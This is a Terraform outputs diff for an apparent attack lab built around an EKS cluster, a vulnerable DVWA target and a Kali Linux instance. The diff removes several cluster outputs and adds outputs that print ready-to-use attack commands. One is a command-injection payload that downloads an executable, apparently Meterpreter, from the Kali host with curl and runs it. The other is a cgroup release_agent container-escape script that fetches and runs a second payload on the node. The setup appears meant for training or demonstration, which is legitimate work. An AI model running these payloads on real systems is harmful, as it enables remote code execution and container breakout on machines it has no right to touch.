@@ -26,80 +26,14 @@ output "cluster_id" {
   value       = module.eks.cluster_id
 }
 
-output "cluster_platform_version" {
-  description = "Platform version for the cluster"
-  value       = module.eks.cluster_platform_version
-}
+# output "cluster_platform_version" {
+#   description = "Platform version for the cluster"
+#   value       = module.eks.cluster_platform_version
+# }
 
 output "cluster_status" {
   description = "Status of the EKS cluster. One of `CREATING`, `ACTIVE`, `DELETING`, `FAILED`"
   value       = module.eks.cluster_status
-}
-
-output "cluster_primary_security_group_id" {
-  description = "Cluster security group that was created by Amazon EKS for the cluster. Managed node groups use this security group for control-plane-to-data-plane communication. Referred to as 'Cluster security group' in the EKS console"
-  value       = module.eks.cluster_primary_security_group_id
-}
-
-################################################################################
-# Security Group
-################################################################################
-
-output "cluster_security_group_arn" {
-  description = "Amazon Resource Name (ARN) of the cluster security group"
-  value       = module.eks.cluster_security_group_arn
-}
-
-output "cluster_security_group_id" {
-  description = "ID of the cluster security group"
-  value       = module.eks.cluster_security_group_id
-}
-
-################################################################################
-# Node Security Group
-################################################################################
-
-output "node_security_group_arn" {
-  description = "Amazon Resource Name (ARN) of the node shared security group"
-  value       = module.eks.node_security_group_arn
-}
-
-output "node_security_group_id" {
-  description = "ID of the node shared security group"
-  value       = module.eks.node_security_group_id
-}
-
-################################################################################
-# IAM Role
-################################################################################
-
-output "cluster_iam_role_name" {
-  description = "IAM role name of the EKS cluster"
-  value       = module.eks.cluster_iam_role_name
-}
-
-output "cluster_iam_role_arn" {
-  description = "IAM role ARN of the EKS cluster"
-  value       = module.eks.cluster_iam_role_arn
-}
-
-output "cluster_iam_role_unique_id" {
-  description = "Stable and unique string identifying the IAM role"
-  value       = module.eks.cluster_iam_role_unique_id
-}
-
-################################################################################
-# EKS Managed Node Group
-################################################################################
-
-output "eks_managed_node_groups" {
-  description = "Map of attribute maps for all EKS managed node groups created"
-  value       = module.eks.eks_managed_node_groups
-}
-
-output "eks_managed_node_groups_autoscaling_group_names" {
-  description = "List of the autoscaling group names created by EKS managed node groups"
-  value       = module.eks.eks_managed_node_groups_autoscaling_group_names
 }
 
 
@@ -107,10 +41,10 @@ output "eks_managed_node_groups_autoscaling_group_names" {
 # Additional
 ################################################################################
 
-output "aws_auth_configmap_yaml" {
-  description = "Formatted yaml output for base aws-auth configmap containing roles used in cluster node groups/fargate profiles"
-  value       = module.eks.aws_auth_configmap_yaml
-}
+# output "aws_auth_configmap_yaml" {
+#   description = "Formatted yaml output for base aws-auth configmap containing roles used in cluster node groups/fargate profiles"
+#   value       = module.eks.aws_auth_configmap_yaml
+# }
 
 output "region" {
   description = "AWS region"
@@ -121,14 +55,53 @@ output "region" {
 # Additional
 ################################################################################
 
-# output "ecr_url" {
-#   value = aws_ecr_repository.dvwa.repository_url
-# }
-
-# output "ecr_id" {
-#   value = aws_ecr_repository.dvwa.registry_id
-# }
-
 output "kali_linux_public_ip" {
-  value = module.ec2_instance.public_ip
+  value = <<EOT
+
+################################################################################
+# KALI LINUX SSH:
+################################################################################
+  
+ssh -i ${var.ssh_key_path} kali@${module.ec2_instance.public_ip}
+
+
+EOT
+}
+
+output "command_injection" {
+  value = <<COMMAND_INJECTION
+
+################################################################################
+# USE THIS FOR THE COMMAND INJECTION:
+################################################################################
+
+;curl -vk http://${module.ec2_instance.public_ip}:8001/met-container -o /tmp/met
+
+;chmod 777 /tmp/met
+
+;/tmp/met
+
+  
+  COMMAND_INJECTION
+}
+
+output "escape_container_script" {
+  value = <<EOT
+
+################################################################################
+# USE THIS TO ESCAPE CONTAINER ONTO THE HOST
+################################################################################
+
+mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
+echo 1 > /tmp/cgrp/x/notify_on_release
+echo "$(sed -n 's/.*\upperdir=\([^,]*\).*/\1/p' /proc/mounts)/cmd" > /tmp/cgrp/release_agent
+echo '#!/bin/sh' > /cmd
+echo "curl -vk http://${module.ec2_instance.public_ip}:8001/met-host -o /run/met" >> /cmd
+echo "chmod 777 /run/met" >> /cmd
+echo "/run/met" >> /cmd
+chmod a+x /cmd
+sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
+
+
+  EOT
 }
